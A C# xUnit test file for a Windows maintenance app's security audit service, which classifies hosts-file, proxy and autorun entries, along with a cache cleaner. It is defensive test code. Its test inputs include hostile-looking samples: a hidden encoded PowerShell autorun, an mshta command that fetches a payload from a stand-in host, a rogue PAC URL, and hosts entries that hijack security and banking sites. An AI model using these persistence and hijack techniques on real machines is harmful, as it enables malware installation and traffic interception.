using System.Globalization;
using System.IO;
using WinCareDesktop.Services;
using WinCareDesktop.ViewModels;
using Xunit;

namespace WinCareDesktop.Tests;

public class SecurityAndDeepCacheTests
{
    [Theory]
    [InlineData(null, SecurityFindingLevel.Clean)]
    [InlineData("", SecurityFindingLevel.Clean)]
    [InlineData("# comment line only\n127.0.0.1 localhost\n::1 localhost", SecurityFindingLevel.Clean)]
    [InlineData("0.0.0.0 ads.tracker.example\n127.0.0.1 telemetry.adserver.example", SecurityFindingLevel.Clean)]
    [InlineData("127.0.0.1 host.docker.internal\n127.0.0.1 kubernetes.docker.internal", SecurityFindingLevel.Clean)]
    [InlineData("203.0.113.55 intranet-portal.corp", SecurityFindingLevel.Review)]
    [InlineData("127.0.0.1 windowsupdate.microsoft.com", SecurityFindingLevel.Warning)]
    [InlineData("0.0.0.0 www.malwarebytes.com", SecurityFindingLevel.Warning)]
    [InlineData("198.51.100.9 www.virustotal.com", SecurityFindingLevel.Warning)]
    [InlineData("198.51.100.9 www.paypal.com", SecurityFindingLevel.Warning)]
    public void Hosts_audit_classifies_clean_sinkhole_custom_and_security_hijacks(
        string? hostsText, SecurityFindingLevel expectedLevel)
    {
        var finding = SecurityThreatAuditService.EvaluateHostsText(hostsText);
        Assert.Equal("HOSTS", finding.Category);
        Assert.Equal(expectedLevel, finding.Level);
    }

    [Theory]
    [InlineData(false, null, null, SecurityFindingLevel.Clean)]
    [InlineData(false, "127.0.0.1:8080", null, SecurityFindingLevel.Clean)]
    [InlineData(true, "", null, SecurityFindingLevel.Clean)]
    [InlineData(true, "127.0.0.1:8888", null, SecurityFindingLevel.Review)]
    [InlineData(false, null, "http://rogue-proxy.example/wpad.pac", SecurityFindingLevel.Warning)]
    [InlineData(true, "10.0.0.2:8080", "http://corp.example/proxy.pac", SecurityFindingLevel.Warning)]
    public void Proxy_audit_flags_pac_hijacks_and_active_proxies(
        bool enabled, string? server, string? pacUrl, SecurityFindingLevel expectedLevel)
    {
        var finding = SecurityThreatAuditService.EvaluateProxyState(enabled, server, pacUrl);
        Assert.Equal("PROXY", finding.Category);
        Assert.Equal(expectedLevel, finding.Level);
    }

    [Theory]
    [InlineData("HKCU\\Run", "Updater", "powershell.exe -w hidden -enc SQBFAFgA", SecurityFindingLevel.Warning)]
    [InlineData("HKCU\\Run", "Dropper", "mshta.exe http://bad.example/payload.hta", SecurityFindingLevel.Warning)]
    [InlineData("HKCU\\Run", "Script", "wscript.exe C:\\Scripts\\loader.vbs", SecurityFindingLevel.Warning)]
    [InlineData("HKCU\\Run", "TempExe", "\"C:\\Users\\Alice\\AppData\\Local\\Temp\\svchost.exe\"", SecurityFindingLevel.Warning)]
    [InlineData("Startup Folder", "DownloadExe", "C:\\Users\\Alice\\Downloads\\setup_crack.exe", SecurityFindingLevel.Warning)]
    [InlineData("HKLM\\Run", "PublicDrop", "C:\\Users\\Public\\updater.exe", SecurityFindingLevel.Warning)]
    [InlineData("HKLM\\Run", "Steam", "\"C:\\Program Files (x86)\\Steam\\steam.exe\" -silent", SecurityFindingLevel.Clean)]
    [InlineData("HKCU\\Run", "OneDrive", "\"C:\\Users\\Alice\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe\" /background", SecurityFindingLevel.Clean)]
    public void Autorun_persistence_audit_catches_lolbins_and_drop_folders(
        string source, string name, string command, SecurityFindingLevel expectedLevel)
    {
        var findings = SecurityThreatAuditService.EvaluateAutorunEntries(new[] { (source, name, command) });
        Assert.Contains(findings, f => f.Level == expectedLevel);
    }

    [Fact]
    public async Task DefenderViewModel_persistence_audit_populates_findings_read_only()
    {
        var auditSvc = new SecurityThreatAuditService
        {
            ReadHostsContent = () => "127.0.0.1 localhost\n0.0.0.0 malwarebytes.com",
            ReadProxySettings = () => (false, null, "http://evil.example/pac.js"),
            ReadSecurityPosture = () => new(true, true, true, "Warn", true),
            ReadAutorunCommands = () => new[] { ("HKCU\\Run", "Sneaky", "powershell -enc AAA=") }
        };
        var vm = new DefenderViewModel { ThreatAudit = auditSvc };
        await vm.RunPersistenceAuditAsync();

        Assert.Equal(7, vm.AuditFindings.Count);
        Assert.Equal(3, vm.AuditFindings.Count(f => f.Level == SecurityFindingLevel.Warning));
        Assert.Equal(4, vm.AuditFindings.Count(f => f.Level == SecurityFindingLevel.Clean));
        Assert.Contains("3 high-priority warning(s)", vm.AuditSummaryText);
    }

    [Fact]
    public void DeepCacheScanner_scans_and_cleans_only_unchanged_unlocked_files_within_approved_roots()
    {
        var root = Path.Combine(Path.GetTempPath(), "deep-cache-" + Guid.NewGuid());
        var browserCache = Path.Combine(root, "Cache_Data");
        Directory.CreateDirectory(browserCache);

        var removable = Path.Combine(browserCache, "f_0001");
        var modified = Path.Combine(browserCache, "f_0002");
        var locked = Path.Combine(browserCache, "data_1");
        File.WriteAllText(removable, "cache-bytes-1234");
        File.WriteAllText(modified, "before");
        File.WriteAllText(locked, "in-use-by-browser");

        try
        {
            var scanner = new DeepCacheScannerService
            {
                CategoryProvider = () => new[]
                {
                    ("browser-cache", "Browser HTTP & Code Caches", "Fixture cache", new[] { browserCache }, "*")
                }
            };

            var snapshot = scanner.ScanSafeCaches();
            var cat = Assert.Single(snapshot);
            Assert.Equal(3, cat.FileCount);

            // Mutate one file after snapshot & lock another (simulating running Chrome)
            File.WriteAllText(modified, "changed-after-preview-longer");
            using var lockStream = new FileStream(locked, FileMode.Open, FileAccess.ReadWrite, FileShare.None);

            // Safe-mode block check first
            Assert.Throws<InvalidOperationException>(() => scanner.CleanVerifiedSnapshot(snapshot));
            Assert.True(File.Exists(removable));

            // Instance-scoped normal mode: removes only unchanged unlocked file; skips modified & locked!
            scanner.IsSafeMode = () => false;
            var (reclaimed, deleted, skipped) = scanner.CleanVerifiedSnapshot(snapshot);
            Assert.Equal(1, deleted);
            Assert.Equal(2, skipped);
            Assert.Equal(16, reclaimed);
            Assert.False(File.Exists(removable));
            Assert.True(File.Exists(modified));
            Assert.True(File.Exists(locked));
        }
        finally
        {
            if (Directory.Exists(root)) Directory.Delete(root, true);
        }
    }

    [Fact]
    public void Flight_deck_converters_return_frozen_brushes_for_both_states()
    {
        var c = CultureInfo.InvariantCulture;
        Assert.NotNull(BooleanToFlightNavBgConverter.Instance.Convert(true, typeof(object), null!, c));
        Assert.NotNull(BooleanToFlightNavBgConverter.Instance.Convert(false, typeof(object), null!, c));
        Assert.NotNull(BooleanToFlightNavBorderConverter.Instance.Convert(true, typeof(object), null!, c));
        Assert.NotNull(BooleanToFlightNavIconConverter.Instance.Convert(true, typeof(object), null!, c));
        Assert.NotNull(BooleanToFlightNavTitleConverter.Instance.Convert(true, typeof(object), null!, c));
        Assert.NotNull(SecurityLevelToBrushConverter.Instance.Convert(SecurityFindingLevel.Warning, typeof(object), null!, c));
        Assert.NotNull(SecurityLevelToBrushConverter.Instance.Convert(SecurityFindingLevel.Review, typeof(object), null!, c));
        Assert.NotNull(SecurityLevelToBrushConverter.Instance.Convert(SecurityFindingLevel.Clean, typeof(object), null!, c));
    }
}
